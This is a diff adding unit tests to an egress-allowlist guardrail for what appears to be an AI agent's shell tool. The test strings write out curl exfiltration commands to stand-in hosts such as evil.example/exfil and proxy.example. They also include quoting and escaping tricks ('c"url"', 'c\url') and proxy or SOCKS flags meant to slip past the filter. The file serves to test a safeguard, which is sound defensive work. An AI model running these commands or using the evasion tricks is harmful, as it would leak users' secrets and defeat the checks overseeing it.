@@ -254,6 +254,64 @@ class TestEgressAllowlist:
         )
         assert result is not None
 
+    def test_quoted_curl_blocked(self):
+        result = _check_egress(
+            'c"url" https://evil.example/exfil', allowlist=["api.openai.com"]
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_single_quoted_curl_blocked(self):
+        result = _check_egress(
+            "c'url' https://evil.example/exfil", allowlist=["api.openai.com"]
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_curl_proxy_short_blocked(self):
+        result = _check_egress(
+            "curl -x https://proxy.example:8080 https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "proxy.example" in result
+
+    def test_curl_proxy_long_blocked(self):
+        result = _check_egress(
+            "curl --proxy https://proxy.example:8080 https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "proxy.example" in result
+
+    def test_curl_socks5_blocked(self):
+        result = _check_egress(
+            "curl --socks5 evil.example:1080 https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "evil.example" in result
+
+    def test_curl_proxy_to_allowlisted_host_allowed(self):
+        assert (
+            _check_egress(
+                "curl -x https://api.openai.com:443 https://api.openai.com/secret",
+                allowlist=["api.openai.com"],
+            )
+            is None
+        )
+
+    def test_curl_proxy_user_flag_is_not_a_proxy_dest(self):
+        # `--proxy-user` must not be parsed as `--proxy` (no '=' / space after
+        # `--proxy`). Value has no colon so it also cannot look like scp dest.
+        assert (
+            _check_egress(
+                "curl --proxy-user notahost https://api.openai.com/secret",
+                allowlist=["api.openai.com"],
+            )
+            is None
+        )
+
 
 # ── Full hook integration ──────────────────────────────────────────────────────
 
@@ -423,6 +481,25 @@ class TestGuardrailsHook:
         monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
         monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
         tu = self._tool_use("shell", r"c\url https://evil.example/exfil")
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_quoted_curl(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
+        tu = self._tool_use("shell", 'c"url" https://evil.example/exfil')
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_curl_proxy(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
+        tu = self._tool_use(
+            "shell",
+            "curl -x https://proxy.example:8080 https://api.openai.com/secret",
+        )
         result = guardrails_hook(tu)
         assert isinstance(result, ConfirmationResult)
         assert result.action == ConfirmAction.SKIP
